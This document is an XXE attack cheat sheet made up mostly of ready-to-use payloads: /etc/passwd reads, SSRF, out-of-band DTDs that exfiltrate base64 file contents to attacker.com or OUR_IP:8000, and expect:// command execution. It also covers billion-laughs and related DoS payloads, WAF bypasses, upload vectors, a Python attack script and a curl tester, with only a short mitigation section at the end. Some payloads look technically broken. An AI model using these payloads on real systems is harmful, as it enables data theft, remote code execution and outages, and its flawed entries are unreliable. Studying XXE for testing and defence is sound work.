### XML External Entity (XXE) Vulnerability

XML External Entity (XXE) is a security vulnerability that allows an attacker to interfere with an application's processing of XML data. It occurs when an XML input containing a reference to an **external entity** is processed by a weakly configured XML parser.

* **XML Entities:** Placeholders for data. An **External Entity** references an external resource, typically a file on the server's filesystem or a URL.
* **Vulnerable Parsers:** Parsers that resolve external entities (e.g., `libxml2` with default settings) are susceptible.
* **Impact:** Information disclosure (reading files), Server-Side Request Forgery (SSRF), Denial of Service (DoS), or even Remote Code Execution (RCE) in specific configurations.
* **Root Cause:** The XML parser is configured to accept and process declarations within the Document Type Definition (DTD) that reference external resources.

-----

### Understanding DTDs and Entities

#### What is a DTD (Document Type Definition)?

A DTD defines the structure and the legal elements and attributes of an XML document. It can be declared **internally** (within the XML file) or **externally** (referenced from an external source). DTDs are used to validate XML documents and can contain **entity declarations**, which are the core of XXE attacks.

#### Types of Entities

1. **Internal Entities:** Defined within the DTD and contain literal values.

```xml
<!ENTITY internal "Hello World">
```

2. **External Entities:** Reference external resources using system identifiers.

```xml
<!ENTITY external SYSTEM "file:///etc/passwd">
```

3. **Parameter Entities:** Used only within DTDs, prefixed with `%`.

```xml
<!ENTITY % param SYSTEM "http://attacker.com/malicious.dtd">
```

#### DTD Declaration Examples

##### Internal DTD

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY internal "Hello">
]>
<root>&internal;</root>
```

##### External DTD

```xml
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://example.com/external.dtd">
<root>Content</root>
```

##### Mixed DTD with Parameter Entities

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
    %remote;
]>
<root>&exploit;</root>
```

-----

### Basic XXE Payloads and Impact

The most common XXE attack involves defining a custom entity within the Document Type Definition (DTD) that points to a resource using a system identifier.

#### Reading Local Files (Information Disclosure)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

* **Why it's used:** To confirm the vulnerability and extract sensitive system files like user lists (`/etc/passwd`) or configuration files.
* **How it works:** The payload defines an entity named `xxe`. The `SYSTEM "file:///etc/passwd"` directive tells the parser to load the content of the local file into the `xxe` entity. When the application processes the XML and attempts to substitute the `&xxe;` reference, the file's content is inserted into the application's response.

#### Server-Side Request Forgery (SSRF)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-service/admin"> ]>
<foo>&xxe;</foo>
```

* **Why it's used:** To force the vulnerable server to make HTTP requests to internal network services, potentially bypassing firewall rules.
* **How it works:** The entity definition uses an HTTP or HTTPS protocol handler (instead of `file://`). When the parser resolves this entity, the server initiates an outgoing request to the specified URL (`http://internal-service/admin`).

#### Directory Listing and Windows Paths

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/"> ]><foo>&xxe;</foo>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"> ]><foo>&xxe;</foo>
```

* **Why it's used:** To test the parser's capabilities and target system-specific files on Linux and Windows platforms.
* **How it works:** By referencing a directory (e.g., `file:///etc/`), the attacker checks if the parser returns an error or a listing. On Windows, the file paths must use the appropriate drive letter and directory structure (e.g., `c:/windows/...`).

-----

### Advanced Entity Definitions and DTD Crafting

#### Parameter Entities for Dynamic DTD Loading

Parameter entities allow attackers to build DTDs dynamically and include external malicious DTDs.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
    %dtd;
]>
<foo>&exploit;</foo>
```

#### Nested Parameter Entities for Complex Attacks

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % start "<!ENTITY &#x25; file SYSTEM 'file:///etc/passwd'>">
    %start;
    <!ENTITY % end "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%file;'>">
    %end;
]>
<foo>&send;</foo>
```

#### Entity Encoding Bypasses

Some filters block certain characters like `%` or `;`. These can be bypassed using:

* HTML/URL encoding: `&#x25;` for `%`
* UTF-16 encoding
* CDATA sections

```xml
<!DOCTYPE foo [
    <!ENTITY % payload "file:///etc/passwd">
    <!ENTITY &#x25; remote SYSTEM "http://attacker.com/xxe.dtd">
    &#x25;remote;
]>
```

#### Custom Protocol Handlers in Entities

Beyond `file://` and `http://`, other handlers may be available:

* `ftp://` - FTP protocol
* `gopher://` - Gopher protocol
* `jar://` - Java archives
* `netdoc://` - Java network documents
* `php://` - PHP wrappers

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "ftp://attacker.com/passwd">
]>
<foo>&xxe;</foo>
```

-----

### XXE in SVG and Other XML Blocks

Any file or data format that uses XML, even non-obvious ones like image formats (SVG) or standardized messages (SOAP), can be used as an injection vector.

#### Basic XXE in SVG (Direct File Reading)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text>&xxe;</text>
</svg>
```

* **Why it's used:** When the application allows **image uploads** (specifically SVG files) and uses an XML parser to process them before rendering.
* **How it works:** The DTD declaration is embedded in the SVG file. When the server processes the SVG (e.g., to validate or render it), the `&xxe;` entity is resolved, and the content of `/etc/passwd` is inserted into the `<text>` element of the resulting SVG output, which is then returned to the attacker.

#### XXE in SOAP Messages

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <soap:Body>
        <foo>&xxe;</foo>
    </soap:Body>
</soap:Envelope>
```

* **Why it's used:** In web services that process **SOAP requests**, typically over HTTP or HTTPS APIs.
* **How it works:** The attacker places the malicious DTD immediately after the XML declaration but before the main `<soap:Body>` tag. The parser processes the DTD and resolves the entity, achieving file access or SSRF within the context of the web service call.

#### XXE in RSS/Atom Feeds

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
    <channel>
        <title>&xxe;</title>
        <description>Feed</description>
    </channel>
</rss>
```

#### XXE in DOCX/ODT Files

Office documents (DOCX, ODT) are ZIP files containing XML. An attacker can:

1. Extract the document
2. Modify `document.xml.rels` or `content.xml`
3. Insert XXE payload
4. Re-zip and upload

-----

### Blind XXE and Out-of-Band (OOB) Exfiltration

Blind XXE occurs when the application successfully processes the XML input but does **not display the output** (the error message or the resolved entity content) to the user. This requires an **Out-of-Band (OOB) attack** to leak data.

#### OOB Data Exfiltration Setup

This technique requires the attacker to host a malicious DTD file on a controlled external server (`http://OUR_IP:8000/xxe.dtd`).

1. **Attacker's Malicious DTD (`xxe.dtd`):** This file defines entities that base64-encode the target file content and then send it via an HTTP request.

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

2. **Attacker's Payload to Server:** This triggers the parser to fetch the malicious DTD.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
    %remote;
    %oob;
]><root>&content;</root>
```

* **Why it's used:** When the application is vulnerable but does not echo the entity's output back to the attacker (blind scenario).
* **How it works:**
  * The XML parser reads the **remote parameter entity** `%remote;`, fetching the external `xxe.dtd` from the attacker's server.
  * The `xxe.dtd` is loaded, defining a file entity (`%file;`) that reads and **Base64-encodes** the target file (`/etc/passwd`).
  * The DTD then defines the OOB entity (`%oob;`), which constructs a URL: `http://OUR_IP:8000/?content=...[base64 data]...`
  * The final entity references (`%oob;` and `&content;`) force the vulnerable server to make a **GET request back to the attacker's server**, revealing the Base64-encoded file content in the request URI.

#### Error-Based XXE (Out-of-Band Exfiltration)

* **Why it's used:** To exfiltrate data when the application doesn't show output but displays **error messages** containing the resolved entity values.
* **How it works:** The attacker forces the server to include the target file's content in a URL that references a non-existent local file. When the parser tries to resolve this non-existent resource, it triggers a system error that includes the full path attempted, which contains the content of the target file.

**Example DTD (`error.dtd`):**

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

#### DNS Exfiltration via XXE

```xml
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dns SYSTEM "http://%file;.attacker.com/">
]>
<foo>&dns;</foo>
```

* **How it works:** The file content is included in a DNS subdomain lookup, which can be captured by the attacker's DNS server.

#### FTP Exfiltration

```xml
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % ftp SYSTEM "ftp://attacker.com/%file;">
]>
<foo>&ftp;</foo>
```

-----

### Advanced Protocol and Wrapper Techniques

Attackers leverage various protocol handlers and language-specific wrappers to extend the capabilities of XXE beyond simple file reading.

#### Base64 Encoding with PHP Wrappers

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> ]><foo>&xxe;</foo>
```

* **Why it's used:** To read binary files or files containing characters that would **break XML parsing** (like `<`, `>`, `&`).
* **How it works:** The `php://filter` wrapper is used to process the target file. The filter `convert.base64-encode` ensures the file's content is encoded into a safe Base64 string before it is returned to the XML parser, preventing parsing errors.

#### Expect Wrapper (Remote Code Execution)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://whoami"> ]><foo>&xxe;</foo>
```

* **Why it's used:** To achieve **Remote Code Execution (RCE)** on servers running PHP with the `expect` module enabled (a rare, high-impact scenario).
* **How it works:** The `expect://` wrapper treats the entity content (`whoami`) as a command to be executed by the operating system. The output of the command is then returned to the XML parser.

#### Denial of Service (DoS) - Billion Laughs Attack

```xml
<!DOCTYPE data [
    <!ENTITY a "dos">
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
    ]><data>&c;</data>
```

* **Why it's used:** To consume excessive memory and CPU resources, causing the application or server to crash.
* **How it works:** This creates a deep **nested expansion** of entities. For example, resolving `&c;` requires resolving ten `&b;` entities, each resolving ten `&a;` entities. The parser's resource consumption explodes exponentially, leading to a crash.

#### Java-Specific Wrappers

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
]>
<foo>&xxe;</foo>
```

#### .NET-Specific Wrappers

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "C:\Windows\System32\drivers\etc\hosts">
]>
<foo>&xxe;</foo>
```

-----

### Advanced Remote Code Execution via PHP Filters and Expect

An advanced technique combines the PHP filter with the `expect://` wrapper to achieve remote command execution. This is possible when the server has the PHP `expect` module enabled.

#### Command Execution via PHP Filter and Expect Wrapper

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=expect://whoami"> ]>
<foo>&xxe;</foo>
```

* **Why it's used:** To execute operating system commands and obtain their output when the server has the `expect` module enabled.
* **How it works:** The `expect://` wrapper executes the specified command (`whoami` in this case), and the PHP `convert.base64-encode` filter encodes the command output in Base64. This is useful to avoid special character issues in XML.

#### Advanced RCE with Command Chaining

```xml
<!DOCTYPE foo [
    <!ENTITY cmd1 SYSTEM "expect://id">
    <!ENTITY cmd2 SYSTEM "expect://ls -la /">
    <!ENTITY cmd3 SYSTEM "expect://cat /etc/passwd">
]>
<foo>
    &cmd1;
    &cmd2;
    &cmd3;
</foo>
```

* **Why it's used:** To execute multiple commands and gather system information.
* **How it works:** Multiple entities are defined that execute different system commands. Each command runs independently and its output is inserted into the XML document.

#### RCE with OOB Data Exfiltration via Expect

```dtd
<!ENTITY % file SYSTEM "expect://whoami">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?output=%file;'>">
%oob;
```

* **Why it's used:** To execute commands in a blind XXE scenario and exfiltrate the output to an attacker-controlled server.
* **How it works:** The `%file;` entity executes the `whoami` command using `expect://`, then the `%oob;` entity sends the output to a remote server via an HTTP request.

#### Combining PHP Filters with Expect for Complex Exploitation

```xml
<!DOCTYPE foo [
    <!ENTITY cmd SYSTEM "php://filter/convert.base64-encode/resource=expect://cat /etc/passwd | base64">
]>
<foo>&cmd;</foo>
```

* **Why it's used:** To handle complex command outputs that may contain problematic characters for XML.
* **How it works:** The command `cat /etc/passwd | base64` is executed through `expect://`, and then the PHP filter additionally encodes the already Base64-encoded output, providing double encoding for maximum compatibility.

#### RCE via Java XML Parsers

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://localhost:8080/manager/html">
]>
<foo>&xxe;</foo>
```

* **Target:** Tomcat Manager interface accessible via XXE-SSRF

-----

### XXE via File Upload Attacks

#### XXE in Image Metadata (EXIF)

Attackers can embed XXE payloads in image metadata:

```bash
exiftool -Comment='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' image.jpg
```

#### XXE in Office Documents

1. Extract `.docx` as ZIP
2. Modify `word/document.xml`
3. Insert XXE payload
4. Re-zip and upload

#### XXE in PDF Files

Some PDF parsers process XML metadata:

```xml
<?xpacket begin='' id='W5M0MpCehiHzreSzNTczkc9d'?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<x:xmpmeta xmlns:x='adobe:ns:meta/'>
    <rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>
        <foo>&xxe;</foo>
    </rdf:RDF>
</x:xmpmeta>
```

-----

### Detection and Exploitation Tools

Attackers use standard penetration testing tools, often configured for OOB testing, to identify and exploit XXE vulnerabilities.

#### Burp Suite and Collaborator

* **Why it's used:** The **Burp Collaborator** is essential for detecting **blind XXE** vulnerabilities.
* **How it works:** The attacker embeds a unique Collaborator URL into a blind XXE payload (e.g., `<!ENTITY xxe SYSTEM "http://COLLABORATOR_ID.burpcollaborator.net/test">`). If the XML parser is vulnerable and attempts to resolve the external entity, the Collaborator records the inbound DNS or HTTP request, confirming the vulnerability.

#### Custom Python Scripts (Automated Testing)

```python
import requests

url = "http://vulnerable.com/process"
payload = """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>"""

response = requests.post(url, data=payload)
print(response.text)
```

* **Why it's used:** To quickly automate testing against known endpoints and check for immediate file content leakage in the response body.
* **How it works:** The script sends the XML payload to the target endpoint, expecting the file contents (`root:x:0:0...`) to be reflected in the HTTP response.

#### OOB Testing Tool - XXEinjector

```bash
ruby XXEinjector.rb --host=attacker.com --file=request.xml --path=/etc/passwd
```

#### Automated Scanner - xxe.sh

```bash
#!/bin/bash
# Simple XXE tester
echo '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY % xxe SYSTEM "'$1'"> %xxe; ]><test></test>' | curl -X POST -H "Content-Type: application/xml" -d @- $2
```

-----

### Advanced Data Exfiltration Techniques

These techniques are utilized when basic XXE is blocked or when the target file contains special characters that would cause XML parsing errors.

#### Advanced File Disclosure with CDATA

When reading files that contain special XML characters (like `<` or `&`), a direct entity substitution will break the XML document structure, leading to an error before the content can be viewed. The solution is to wrap the file content in a **CDATA section**.

* **Why it's used:** To read complex files (like configuration files or binary data) without causing XML parsing errors due to special characters.
* **How it works:** CDATA sections instruct the XML parser to treat the enclosed content as literal character data, ignoring any XML markup rules. This preserves the original file content exactly.

1. **Attacker's DTD (`xxe.dtd`) on external server:** The DTD is designed to wrap the file content in CDATA tags.

```dtd
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///path/to/target/file">
<!ENTITY % end "]]>">
<!ENTITY % xxe "<!ENTITY all '%begin;%file;%end;'>">
%xxe;
```

2. **Attacker's Payload to Vulnerable Endpoint:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://YOUR_SERVER/xxe.dtd">
    %dtd;
]><data>&all;</data>
```

* **Explanation:**
  * The vulnerable server fetches the DTD.
  * The parser defines `%file;` (which reads the target file).
  * The parser then defines the final entity `&all;` which concatenates the literal string `<![CDATA[`, the file content, and the literal string `]]>`.
  * When the server substitutes `&all;` in the `<data>` tag, the output remains valid XML, allowing the attacker to view the file content.

#### Base64 Encoding for Robust Exfiltration

Base64 encoding is an excellent technique to ensure that complex file content, regardless of characters or line endings, can be safely transferred and decoded later.

#### Base64 Encoding using PHP Wrappers

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> ]><foo>&xxe;</foo>
```

* **Why it's used:** To read files that might contain binary data or invalid XML characters, ensuring the entire content is safely returned as a clean, text-only string.
* **How it works:** The **PHP Wrapper** `php://filter` is used to preprocess the content of the file. The `convert.base64-encode` filter encodes the content of the target file (`/etc/passwd`) before the XML parser processes it. The parser then receives and returns the Base64 string, which the attacker decodes client-side. This is highly reliable for direct output XXE.

#### Blind Out-of-band (OOB) Exfiltration with Base64

This combines the Base64 encoding filter with the OOB technique to exfiltrate data from a blind XXE scenario.

1. **Attacker's DTD (`xxe.dtd`) on external server:**

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
%oob;
```

2. **Attacker's Listener (e.g., Python/PHP server on port 8000):** This server captures and decodes the incoming request.

```python
# Captures GET request, extracts 'content' parameter, and decodes Base64
content = self.path.split('content=')[1]
decoded = base64.b64decode(content).decode('utf-8')
print(decoded)
```

* **Why it's used:** This is the most effective method for **Blind XXE**, where no error messages or output are returned to the attacker.
* **How it works:** The parser performs an internal Base64 encoding on the target file. The encoded result is then inserted into the **URL** that the server is forced to request from the attacker's machine. The attacker's listener captures the request and decodes the parameter value to retrieve the file content.

#### Advanced RCE with Base64-Encoded Command Output

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=expect://id">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?cmd_output=%file;'>">
%oob;
```

* **Why it's used:** To execute commands on a vulnerable server and exfiltrate the Base64-encoded output, avoiding special character issues in HTTP transmission.
* **How it works:** The `id` command is executed via `expect://`, the output is Base64-encoded using the PHP filter, and then sent to an attacker-controlled server via an HTTP request.

-----

### XXE Bypass Techniques

#### Bypassing Input Filters

##### WAF Bypass with UTF-16 Encoding

```xml
<?xml version="1.0" encoding="UTF-16BE"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

##### Bypass with HTML Entities

```xml
<!DOCTYPE foo [
    <!ENTITY % percent "&#x25;">
    <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
    &#x25;remote;
]>
```

##### Bypass with CDATA Comments

```xml
<!DOCTYPE foo [
    <!ENTITY <!-- -->xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

#### Bypassing Disabled External Entities

If `libxml2` is configured with `LIBXML_NOENT` or similar:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe 'file:///etc/passwd'>
]>
<foo>&xxe;</foo>
```

#### XXE via XInclude

When DTD is blocked, use XInclude:

```xml
<?xml version="1.0"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

#### XXE via SVG `<use>` Element

```xml
<svg xmlns="http://www.w3.org/2000/svg">
    <use href="file:///etc/passwd"/>
</svg>
```

-----

### Denial of Service (DoS) - Advanced Attacks

#### Billion Laughs Attack (Enhanced)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY a "AAAAA">
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
    <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
    <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
    <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
    <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
    <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
    <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
]>
<data>&i;</data>
```

#### Quadratic Blowup Attack

```xml
<!DOCTYPE data [
    <!ENTITY a "AAAAAAAAAAAAAAAAAAAA">
]>
<data>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;... [repeated thousands of times]</data>
```

#### Entity Reference Loops

```xml
<!DOCTYPE data [
    <!ENTITY a "&b;">
    <!ENTITY b "&a;">
]>
<data>&a;</data>
```

-----

### Prevention and Mitigation

#### Secure XML Parser Configuration

1. **Disable DTD processing entirely**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

2. **Disable external entities**

```java
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

3. **Use secure XML libraries**

* Use SAX over DOM parsers
* Prefer StAX for streaming

#### Input Validation and Sanitization

* Validate XML against a strict schema
* Use allowlists for acceptable characters
* Filter/escape `<!DOCTYPE` and `<!ENTITY`

#### Network-Level Protections

* Egress filtering to block outbound requests from application servers
* WAF rules to detect XXE patterns
* Regular security updates for XML parsers

-----

**Made with love by VIsh0k**